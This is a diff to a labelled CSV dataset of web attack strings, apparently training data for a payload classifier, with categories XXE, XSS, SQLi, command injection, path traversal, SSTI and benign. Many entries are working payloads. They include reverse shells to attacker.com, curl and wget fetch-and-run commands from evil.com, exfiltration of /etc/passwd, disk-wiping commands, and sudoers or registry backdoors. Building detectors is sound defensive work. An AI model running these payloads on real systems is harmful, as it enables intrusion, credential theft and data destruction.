-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://cat /etc/passwd'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/cmdline'>]><test>&xxe;</test>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/fd/0'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aXXE%250d%250a.%250d%250aQUIT%250d%250a'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'jar:file:///var/www/html/upload.zip!/shell.php'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/win.ini'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'netdoc:/etc/passwd'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/issue'>]><root>&xxe;</root>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/www/html/index.php'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///usr/local/apache2/conf/httpd.conf'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///opt/tomcat/conf/server.xml'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///var/log/nginx/error.log'><!ENTITY % dtd SYSTEM 'http://attacker.com/log.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://nc -lvvp 4444'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/net/tcp'>]><test>&xxe;</test>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///sys/class/net/eth0/address'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://input'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/shadow'><!ENTITY % remote SYSTEM 'http://attacker.com/exfil.dtd'>%remote;%local;%send;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://wget http://evil.com/shell.sh -O /tmp/s.sh'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/user/.bashrc'>]><root>&xxe;</root>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///opt/app/config/database.yml'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/lib/mysql/my.cnf'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/mysql/my.cnf'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///app/config/secrets.yml'><!ENTITY % dtd SYSTEM 'http://attacker.com/steal.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/status'>]><test>&xxe;</test>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/maps'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'ftp://attacker.com:21/xxe.txt'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'dict://attacker.com:11211/stats'>]><data>&file;</data>","XXE"
-"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system.ini'>]><root>&xxe;</root>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/tasks/at.exe'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/system'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/pagefile.sys'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/repair/sam'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/boot.ini'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///c:/autoexec.bat'>]><test>&xxe;</test>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/config.sys'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/resolv.conf'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts.allow'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/hosts.deny'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/crontab'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/fstab'>]><root>&xxe;</root>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/group'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/gshadow'>]><foo>&xxe;</foo>","XXE"
-"admin","Benign"
-"password123","Benign"
-"/index.php","Benign"
-"search.php?query=test","Benign"
-"John Doe","Benign"
-"About Us","Benign"
-"contact.html","Benign"
-"login.php","Benign"
-"my_username","Benign"
-"1 AND 1=1","Benign"
-"category=electronics","Benign"
-"home","Benign"
-"products","Benign"
-"about-us","Benign"
-"contact-us","Benign"
-"services","Benign"
-"blog","Benign"
-"news","Benign"
-"faq","Benign"
-"help","Benign"
-"support","Benign"
-"login","Benign"
-"register","Benign"
-"signup","Benign"
-"profile","Benign"
-"dashboard","Benign"
-"settings","Benign"
-"account","Benign"
-"cart","Benign"
-"checkout","Benign"
-"payment","Benign"
-"search","Benign"
-"results","Benign"
-"category","Benign"
-"product-details","Benign"
-"user-guide","Benign"
-"documentation","Benign"
-"api-docs","Benign"
-"terms","Benign"
-"privacy","Benign"
-"cookies","Benign"
-"sitemap","Benign"
-"404","Benign"
-"error","Benign"
-"test","Benign"
-"demo","Benign"
-"sample","Benign"
-"example","Benign"
-"index.html","Benign"
-"page.php","Benign"
-"view.asp","Benign"
-"default.jsp","Benign"
-"main.py","Benign"
-"app.js","Benign"
-"style.css","Benign"
-"image.jpg","Benign"
-"file.pdf","Benign"
-"document.docx","Benign"
-"data.json","Benign"
-"config.xml","Benign"
-"readme.md","Benign"
-"username123","Benign"
-"password","Benign"
-"email@example.com","Benign"
-"123-456-7890","Benign"
-"New York","Benign"
-"Product Name","Benign"
-"Description here","Benign"
-"Click here","Benign"
-"Learn more","Benign"
-"Buy now","Benign"
-"Add to cart","Benign"
-"Submit","Benign"
-"Cancel","Benign"
-"Save","Benign"
-"Delete","Benign"
-"Edit","Benign"
-"View","Benign"
-"Download","Benign"
-"Upload","Benign"
-"Share","Benign"
-"Like","Benign"
-"Comment","Benign"
-"Follow","Benign"
-"Unfollow","Benign"
-"Subscribe","Benign"
-"Unsubscribe","Benign"
-"Hello World","Benign"
-"Welcome","Benign"
-"Thank you","Benign"
-"Goodbye","Benign"
-"Yes","Benign"
-"No","Benign"
-"Maybe","Benign"
-"OK","Benign"
-"localhost","Benign"
-"127.0.0.1","Benign"
-"192.168.1.1","Benign"
-"google.com","Benign"
-"8.8.8.8","Benign"
-"/products/view?id=1024&category=books","Benign"
-"/search?q=hello+world&sort=desc","Benign"
-"/api/v1/user/profile?uid=5912","Benign"
-"/login?redirect=/dashboard","Benign"
-"/bbs/board.php?bo_table=free&wr_id=10","Benign"
-"email=support@shieldhub.com","Benign"
-"date=2025-11-14","Benign"
-"price=1,000,000","Benign"
-"comment=This+is+great!","Benign"
-"refer=https://google.com","Benign"
-"user_agent=Mozilla/5.0","Benign"
-"path=/usr/local/bin (docs)","Benign"
-"1+1=2","Benign"
-"admin_page","Benign"
-"sub_title=Hello&World","Benign"
-"msg=alert(message)","Benign"
-"desc=10% discount","Benign"
-"file=report.pdf","Benign"
-"javascript:void(0)","Benign"
-"javascript:history.back()","Benign"
-"<img src='logo.png'>","Benign"
-"<b>Bold Text</b>","Benign"
-"<i>Italic</i>","Benign"
-"width=100%","Benign"
-"height=50px","Benign"
-"x=10&y=20","Benign"
-"kor=안녕하세요","Benign"
-"eng=Hello","Benign"
-"%00","Benign"
-"%20","Benign"
+text,label
+<script>alert('XSS')</script>,XSS
+<img src=x onerror=alert(1)>,XSS
+<svg/onload=alert(1)>,XSS
+<iframe src='javascript:alert(1)'></iframe>,XSS
+<a onmouseover=alert(1)>XSS</a>,XSS
+<script>document.cookie</script>,XSS
+<script src=http://evil.com/xss.js></script>,XSS
+<body onload=alert('XSS')>,XSS
+<input onfocus=alert(1) autofocus>,XSS
+<select onfocus=alert(1) autofocus>,XSS
+<textarea onfocus=alert(1) autofocus>,XSS
+<keygen onfocus=alert(1) autofocus>,XSS
+<video><source onerror=alert(1)>,XSS
+<audio src=x onerror=alert(1)>,XSS
+<details open ontoggle=alert(1)>,XSS
+<marquee onstart=alert(1)>,XSS
+<meter onmouseover=alert(1)>0</meter>,XSS
+<object data=javascript:alert(1)>,XSS
+<embed src=javascript:alert(1)>,XSS
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>,XSS
+<math><mtext><script>alert(1)</script></mtext></math>,XSS
+'';!--<XSS>=&{()},XSS
+<IMG SRC=javascript:alert('XSS')>,XSS
+<IMG SRC=JaVaScRiPt:alert('XSS')>,XSS
+<IMG SRC=`javascript:alert('XSS')`>,XSS
+"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",XSS
+<IMG onmouseover=alert('XSS')>,XSS
+<BODY ONLOAD=alert('XSS')>,XSS
+<BGSOUND SRC=javascript:alert('XSS')>,XSS
+<BR SIZE=&{alert('XSS')}>,XSS
+<LINK REL=stylesheet HREF=javascript:alert('XSS')>,XSS
+<STYLE>@import'http://evil.com/xss.css';</STYLE>,XSS
+<META HTTP-EQUIV=refresh CONTENT='0;url=javascript:alert(1)'>,XSS
+<IFRAME SRC=javascript:alert('XSS')></IFRAME>,XSS
+<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAMESET>,XSS
+<TABLE BACKGROUND=javascript:alert('XSS')>,XSS
+<DIV STYLE=width:expression(alert('XSS'))>,XSS
+<svg/onload=confirm(1)>,XSS
+<img src=x onerror=prompt(1)>,XSS
+<body onpageshow=alert(1)>,XSS
+<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert(1)></xss>,XSS
+<iframe src=javascript:alert(1)>,XSS
+<input onblur=alert(1) autofocus><input autofocus>,XSS
+<math href=javascript:alert(1)>CLICKME</math>,XSS
+';alert(1)//,XSS
+"\;alert(1)//""",XSS
+javascript://%250Aalert(1),XSS
+<a href='javascript:alert(1)'>Click</a>,XSS
+<form action='javascript:alert(1)'>,XSS
+<isindex type=image src=1 onerror=alert(1)>,XSS
+"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",XSS
+"<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",XSS
+%3Cscript%3E,XSS
+<svg onload=alert(document.domain)>,XSS
+<img src=x onerror=alert(document.cookie)>,XSS
+<details open ontoggle=confirm(1)>,XSS
+<marquee onfinish=alert(1)>,XSS
+<video src=x onerror=alert(1)>,XSS
+<xss id=x tabindex=1 onfocus=alert(1)></xss>,XSS
+"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",XSS
+<svg><set attributeName=onmouseover to=alert(1)>,XSS
+<body onscroll=alert(1)><div style=height:9999px></div>,XSS
+<form><button formaction=javascript:alert(1)>XSS,XSS
+' OR 1=1--,SQLi
+1; SELECT * FROM users--,SQLi
+"UNION SELECT 1,2,3--",SQLi
+'; DROP TABLE users--,SQLi
+"SELECT 1,2,3 FROM users",SQLi
+1' OR '1'='1,SQLi
+1' OR '1'='1' --,SQLi
+1' OR '1'='1' /*,SQLi
+admin' --,SQLi
+admin' #,SQLi
+admin'/*,SQLi
+' or 1=1--,SQLi
+' or 1=1#,SQLi
+' or 1=1/*,SQLi
+') or '1'='1--,SQLi
+') or ('1'='1--,SQLi
+1' ORDER BY 1--,SQLi
+1' ORDER BY 2--,SQLi
+1' ORDER BY 3--,SQLi
+1' GROUP BY 1--,SQLi
+1' GROUP BY 2--,SQLi
+1' UNION SELECT NULL--,SQLi
+"1' UNION SELECT NULL,NULL--",SQLi
+"1' UNION SELECT NULL,NULL,NULL--",SQLi
+1' UNION ALL SELECT NULL--,SQLi
+"1' UNION ALL SELECT NULL,NULL--",SQLi
+1' AND 1=2 UNION SELECT NULL--,SQLi
+' UNION SELECT password FROM users--,SQLi
+"' UNION SELECT username,password FROM users--",SQLi
+1'; DROP TABLE users--,SQLi
+1'; DELETE FROM users--,SQLi
+1'; UPDATE users SET password='hacked'--,SQLi
+"1'; INSERT INTO users VALUES('hacker','pass')--",SQLi
+1'; EXEC xp_cmdshell('dir')--,SQLi
+"1' AND 1=CONVERT(int,(SELECT @@version))--",SQLi
+1' AND 1=CAST((SELECT @@version) as int)--,SQLi
+"1' AND SUBSTRING(@@version,1,1)='M'--",SQLi
+"1' AND ASCII(SUBSTRING(@@version,1,1))>77--",SQLi
+1' WAITFOR DELAY '0:0:5'--,SQLi
+1'; WAITFOR DELAY '0:0:5'--,SQLi
+1' AND SLEEP(5)--,SQLi
+1'; SELECT SLEEP(5)--,SQLi
+"1' AND BENCHMARK(5000000,MD5('A'))--",SQLi
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,SQLi
+"1' AND IF(1=1,SLEEP(5),0)--",SQLi
+1' OR SLEEP(5)--,SQLi
+1' RLIKE SLEEP(5)--,SQLi
+1' REGEXP SLEEP(5)--,SQLi
+"admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",SQLi
+"admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",SQLi
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--,SQLi
+1' AND (SELECT COUNT(*) FROM information_schema.columns)>0--,SQLi
+1' UNION SELECT table_name FROM information_schema.tables--,SQLi
+1' UNION SELECT column_name FROM information_schema.columns--,SQLi
+1' UNION SELECT user()--,SQLi
+1' UNION SELECT database()--,SQLi
+1' UNION SELECT version()--,SQLi
+1' UNION SELECT @@version--,SQLi
+1' UNION SELECT @@datadir--,SQLi
+1' UNION SELECT load_file('/etc/passwd')--,SQLi
+1' AND SLEEP(10)--,SQLi
+"1' AND BENCHMARK(1000000,MD5(1))--",SQLi
+"1' UNION SELECT null, table_name FROM information_schema.tables--",SQLi
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,SQLi
+admin' AND 1=1--,SQLi
+admin') OR ('1'='1,SQLi
+"1 UNION SELECT 1, version(), user()",SQLi
+1 OR 1=1 LIMIT 1,SQLi
+1; WAITFOR DELAY '0:0:5',SQLi
+"1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--",SQLi
+"id=-1 UNION SELECT 1, 2, 3, 4",SQLi
+(SELECT * FROM users WHERE id=1),SQLi
+1 || (SELECT SLEEP(5)),SQLi
+1' OR '1'='1' AND 1=1,SQLi
+1 AND 1=1; --,SQLi
+%27%20OR%201=1,SQLi
+admin'--,SQLi
+' or 1=1 limit 1 --,SQLi
+' or 1=1 limit 1 #,SQLi
+1' order by 1 --,SQLi
+"1' union select 1,2,3 --",SQLi
+"1' union select 1,2,3 #",SQLi
+"1' union select 1,2,3 /*",SQLi
+"1' union select 1,2,3 limit 1 --",SQLi
+"1' union select 1,2,3 limit 1 #",SQLi
+"1' union select 1,2,3 limit 1 /*",SQLi
+; ls,COMMAND_INJECTION
+; ls -la,COMMAND_INJECTION
+; whoami,COMMAND_INJECTION
+; id,COMMAND_INJECTION
+; pwd,COMMAND_INJECTION
+; cat /etc/passwd,COMMAND_INJECTION
+; wget http://evil.com/shell.sh,COMMAND_INJECTION
+; curl http://evil.com/backdoor,COMMAND_INJECTION
+& dir,COMMAND_INJECTION
+& whoami,COMMAND_INJECTION
+& ipconfig,COMMAND_INJECTION
+& netstat -an,COMMAND_INJECTION
+| ls,COMMAND_INJECTION
+| cat /etc/passwd,COMMAND_INJECTION
+| whoami,COMMAND_INJECTION
+| id,COMMAND_INJECTION
+|| whoami,COMMAND_INJECTION
+|| ls -la,COMMAND_INJECTION
+|| cat /etc/shadow,COMMAND_INJECTION
+`whoami`,COMMAND_INJECTION
+`id`,COMMAND_INJECTION
+`cat /etc/passwd`,COMMAND_INJECTION
+`ls -la`,COMMAND_INJECTION
+$(whoami),COMMAND_INJECTION
+$(id),COMMAND_INJECTION
+$(cat /etc/passwd),COMMAND_INJECTION
+$(ls -la),COMMAND_INJECTION
+$(curl http://evil.com),COMMAND_INJECTION
+; nc -e /bin/sh attacker.com 4444,COMMAND_INJECTION
+& nc -e cmd.exe attacker.com 4444,COMMAND_INJECTION
+| nc attacker.com 4444 -e /bin/bash,COMMAND_INJECTION
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1,COMMAND_INJECTION
+; python -c 'import socket',COMMAND_INJECTION
+; perl -e 'use Socket',COMMAND_INJECTION
+; ruby -rsocket,COMMAND_INJECTION
+; php -r '$sock=fsockopen()',COMMAND_INJECTION
+127.0.0.1; ls,COMMAND_INJECTION
+127.0.0.1 && dir,COMMAND_INJECTION
+127.0.0.1 | cat /etc/passwd,COMMAND_INJECTION
+127.0.0.1 || whoami,COMMAND_INJECTION
+8.8.8.8; wget http://evil.com/shell,COMMAND_INJECTION
+google.com & netstat,COMMAND_INJECTION
+; ping -c 10 127.0.0.1,COMMAND_INJECTION
+& ping -n 10 127.0.0.1,COMMAND_INJECTION
+| sleep 10,COMMAND_INJECTION
+cat /etc/passwd,COMMAND_INJECTION
+nc -lvvp 4444,COMMAND_INJECTION
+netcat -e /bin/sh 1.2.3.4 80,COMMAND_INJECTION
+ping -c 1 127.0.0.1,COMMAND_INJECTION
+$(reboot),COMMAND_INJECTION
+`sleep 10`,COMMAND_INJECTION
+eval('phpinfo();'),COMMAND_INJECTION
+system('id'),COMMAND_INJECTION
+; uname -a,COMMAND_INJECTION
+& hostname,COMMAND_INJECTION
+| ps aux,COMMAND_INJECTION
+$(cat /etc/shadow),COMMAND_INJECTION
+`env`,COMMAND_INJECTION
+; killall -9 httpd,COMMAND_INJECTION
+& tasklist,COMMAND_INJECTION
+| ifconfig,COMMAND_INJECTION
+$(rm -rf /),COMMAND_INJECTION
+; chmod 777 /etc/passwd,COMMAND_INJECTION
+& net user hacker password /add,COMMAND_INJECTION
+| iptables -F,COMMAND_INJECTION
+$(wget http://evil.com/backdoor.sh -O /tmp/bd.sh && sh /tmp/bd.sh),COMMAND_INJECTION
+; curl http://evil.com/malware | bash,COMMAND_INJECTION
+; chown root:root /etc/passwd,COMMAND_INJECTION
+& reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe,COMMAND_INJECTION
+| find / -name config.php,COMMAND_INJECTION
+$(export PATH=/tmp:$PATH),COMMAND_INJECTION
+`crontab -l`,COMMAND_INJECTION
+; systemctl stop firewalld,COMMAND_INJECTION
+& sc create backdoor binPath= C:\\backdoor.exe,COMMAND_INJECTION
+| mount -t nfs attacker.com:/share /mnt,COMMAND_INJECTION
+$(echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers),COMMAND_INJECTION
+; iptables -A INPUT -p tcp --dport 4444 -j ACCEPT,COMMAND_INJECTION
+& powershell -ExecutionPolicy Bypass -File C:\\backdoor.ps1,COMMAND_INJECTION
+| useradd -m -s /bin/bash hacker,COMMAND_INJECTION
+$(dd if=/dev/zero of=/dev/sda bs=1M),COMMAND_INJECTION
+../../../etc/passwd,PATH_TRAVERSAL
+..\\..\\..\\windows\\system32\\config\\sam,PATH_TRAVERSAL
+....//....//....//etc/passwd,PATH_TRAVERSAL
+..%2F..%2F..%2Fetc%2Fpasswd,PATH_TRAVERSAL
+..%252F..%252F..%252Fetc%252Fpasswd,PATH_TRAVERSAL
+....\/....\/....\/etc/passwd,PATH_TRAVERSAL
+....\/....\/....\/....\/etc/passwd,PATH_TRAVERSAL
+..;/..;/..;/etc/passwd,PATH_TRAVERSAL
+/app/../../../etc/passwd,PATH_TRAVERSAL
+..%c0%af..%c0%af..%c0%afetc/passwd,PATH_TRAVERSAL
+..%5c..%5c..%5cwindows%5cwin.ini,PATH_TRAVERSAL
+../../../../etc/shadow,PATH_TRAVERSAL
+/var/www/html/../../../../etc/hosts,PATH_TRAVERSAL
+file:///etc/passwd,PATH_TRAVERSAL
+C:\\Windows\\System32\\drivers\\etc\\hosts,PATH_TRAVERSAL
+../../../../../../../../../../etc/passwd,PATH_TRAVERSAL
+..\..\..\..\..\..\..\..\windows\win.ini,PATH_TRAVERSAL
+/etc/passwd%00,PATH_TRAVERSAL
+....//....//....//windows/win.ini,PATH_TRAVERSAL
+..%c1%9c..%c1%9c..%c1%9cetc/passwd,PATH_TRAVERSAL
+..%c0%afetc%c0%afpasswd,PATH_TRAVERSAL
+/var/www/../../etc/passwd,PATH_TRAVERSAL
+C:/windows/system32/config/sam,PATH_TRAVERSAL
+..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam,PATH_TRAVERSAL
+....//....//....//....//etc/passwd%00,PATH_TRAVERSAL
+/etc/shadow%00.jpg,PATH_TRAVERSAL
+../../../../../../../../../../windows/system32/drivers/etc/hosts,PATH_TRAVERSAL
+file:///c:/windows/win.ini,PATH_TRAVERSAL
+php://filter/convert.base64-encode/resource=index.php,PATH_TRAVERSAL
+php://filter/read=string.rot13/resource=index.php,PATH_TRAVERSAL
+zip://shell.zip%23shell.php,PATH_TRAVERSAL
+phar://shell.phar/shell.php,PATH_TRAVERSAL
+expect://id,PATH_TRAVERSAL
+"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",PATH_TRAVERSAL
+/proc/self/environ,PATH_TRAVERSAL
+/proc/self/cmdline,PATH_TRAVERSAL
+/proc/self/fd/0,PATH_TRAVERSAL
+/proc/version,PATH_TRAVERSAL
+/proc/net/tcp,PATH_TRAVERSAL
+....//....//....//....//....//etc/passwd,PATH_TRAVERSAL
+..%252f..%252f..%252f..%252fetc%252fpasswd,PATH_TRAVERSAL
+....\/....\/....\/....\/....\/etc/passwd,PATH_TRAVERSAL
+..;/..;/..;/..;/etc/passwd,PATH_TRAVERSAL
+/app/../../../../../../etc/passwd,PATH_TRAVERSAL
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd,PATH_TRAVERSAL
+..%5c..%5c..%5c..%5cwindows%5cwin.ini,PATH_TRAVERSAL
+....//....//....//....//windows/system32/config/sam,PATH_TRAVERSAL
+../../../../../../../../../../var/log/apache2/access.log,PATH_TRAVERSAL
+file:///var/www/html/../../etc/passwd,PATH_TRAVERSAL
+C:\\inetpub\\wwwroot\\..\\..\\..\\..\\windows\\system32\\config\\sam,PATH_TRAVERSAL
+/etc/passwd%00.txt,PATH_TRAVERSAL
+....//....//....//....//etc/shadow%00,PATH_TRAVERSAL
+../../../../../../../../../../usr/local/apache2/conf/httpd.conf,PATH_TRAVERSAL
+file:///c:/windows/system32/drivers/etc/hosts,PATH_TRAVERSAL
+php://filter/convert.base64-encode/resource=../../../etc/passwd,PATH_TRAVERSAL
+zip://upload.zip%23shell.txt,PATH_TRAVERSAL
+phar://upload.phar/shell.txt,PATH_TRAVERSAL
+expect://ls,PATH_TRAVERSAL
+"data://text/plain,<?php system($_GET['cmd']); ?>",PATH_TRAVERSAL
+/proc/self/fd/1,PATH_TRAVERSAL
+/proc/self/fd/2,PATH_TRAVERSAL
+/proc/cpuinfo,PATH_TRAVERSAL
+/proc/meminfo,PATH_TRAVERSAL
+....//....//....//....//....//....//etc/passwd,PATH_TRAVERSAL
+..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,PATH_TRAVERSAL
+../../../../../../../../../../var/lib/postgresql/data/pg_hba.conf,PATH_TRAVERSAL
+file:///usr/local/nginx/conf/nginx.conf,PATH_TRAVERSAL
+C:\\xampp\\htdocs\\..\\..\\..\\..\\windows\\system32\\config\\system,PATH_TRAVERSAL
+....//....//....//....//....//....//....//etc/passwd,PATH_TRAVERSAL
+..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,PATH_TRAVERSAL
+....\/....\/....\/....\/....\/....\/....\/etc/passwd,PATH_TRAVERSAL
+..;/..;/..;/..;/..;/..;/etc/passwd,PATH_TRAVERSAL
+/app/../../../../../../../../../../etc/passwd,PATH_TRAVERSAL
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd,PATH_TRAVERSAL
+..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,PATH_TRAVERSAL
+....//....//....//....//....//windows/system32/drivers/etc/hosts,PATH_TRAVERSAL
+../../../../../../../../../../opt/lampp/etc/httpd.conf,PATH_TRAVERSAL
+file:///var/lib/mysql/mysql/user.MYD,PATH_TRAVERSAL
+C:\\wamp\\bin\\apache\\apache2.4.46\\conf\\httpd.conf,PATH_TRAVERSAL
+${7*7},SSTI
+{{7*7}},SSTI
+{{config}},SSTI
+{{config.items()}},SSTI
+{{request}},SSTI
+{{request.application}},SSTI
+{{''.class.mro()[1].subclasses()}},SSTI
+{{[].__class__.__base__.__subclasses__()}},SSTI
+<#assign ex=object?api.newInstance()>,SSTI
+${T(java.lang.Runtime).getRuntime().exec('calc')},SSTI
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}},SSTI
+{{lipsum.__globals__.os.popen('id').read()}},SSTI
+{{url_for.__globals__.os.popen('id').read()}},SSTI
+{{g.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}},SSTI
+${@java.lang.Runtime@getRuntime().exec('calc')},SSTI
+<#assign cmd='freemarker.template.utility.Execute'?new()>${cmd('id')},SSTI
+<%= File.open('/etc/passwd').read %>,SSTI
+#{File.read('/etc/passwd')},SSTI
+*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()},SSTI
+{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},SSTI
+"${T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')}",SSTI
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}},SSTI
+{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},SSTI
+{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},SSTI
+"<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.io.File','/etc/passwd').text}",SSTI
+${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))},SSTI
+<%= IO.popen('id').read %>,SSTI
+#{`id`},SSTI
+*{T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(whoami)')},SSTI
+"{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('subprocess').check_output('id',shell=True)}}",SSTI
+"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}",SSTI
+{{dict.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},SSTI
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}},SSTI
